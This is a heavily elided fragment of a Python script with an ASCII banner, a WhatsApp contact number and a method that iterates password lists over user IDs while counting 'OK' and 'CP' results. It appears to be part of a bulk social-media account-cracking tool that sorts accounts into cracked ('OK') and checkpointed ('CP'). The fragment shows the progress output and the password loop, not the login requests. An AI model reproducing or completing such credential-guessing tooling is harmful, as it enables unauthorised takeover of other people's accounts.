 ...
 \033[1;92m  |/ \___/ |/     \|   \_/   (_______/\_______/(______/   
   ...
   WHATSAPP : 01409808749        
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[Bayzid  : \033[0;97m %s/%s -> \033[0;92m [OK🥰:%s ]- \033[0;93m[CP😭:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
